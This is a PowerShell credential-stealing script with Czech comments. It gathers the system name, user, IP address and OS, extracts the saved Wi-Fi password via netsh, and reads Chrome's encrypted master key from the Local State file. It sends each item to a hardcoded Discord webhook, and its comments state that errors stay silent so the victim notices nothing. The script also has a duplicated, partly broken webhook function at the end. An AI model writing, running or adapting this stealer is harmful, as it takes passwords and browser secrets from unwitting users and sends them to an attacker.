# --- KONFIGURACE ---
$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_"
# ------------------

function Send-Webhook {
    param([string]$message)
    $payload = @{ content = $message } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType "application/json"
}

try {
    # 1. Systémové informace
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $comp = hostname
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
    
    $sys_info = "🖥️ **SÝSTEM**: $comp`n👤 **Uživatel**: $user`n🌐 **IP**: $ip`n💿 **OS**: $os"
    Send-Webhook -message $sys_info

    # 2. Wi-Fi Heslo (Aktuální síť)
    $wifi = netsh wlan show profile name="* " key=clear | Select-String "Key Content"
    if ($wifi) {
        $wifi_pass = $wifi.ToString().Split(":")[1].Trim()
        Send-Webhook -message "🔑 **Wi-Fi Heslo**: $wifi_pass"
    }

    # 3. Extrakce Master Key (Local State) z Chrome/Edge
    # Cesta k Local State souboru
    $localStatePath = "$env:LocalAppData\Google\Chrome\User Data\Local State"
    if (Test-Path $localStatePath) {
        $content = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $protectedKey = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content.os_crypt.encrypted_key))
        
        # Posíláme Base64 verzi klíče (to je to, co budeš potřebovat pro dekryptovaní)
        Send-Webhook "🔐 **Chrome Master Key (B64):** `n$protectedKey"
    }

} catch {
    # V případě chyby nic neposíláme, aby oběť nic nezpozorovala
}

function Send-Webhook($msg) {
    $payload = @{ content = $msg } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

# Oprava volání funkce (pro jistotu)
$webhookUrl = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Znovu sem vlož URL, pokud nepoužíváš proměnnou výše
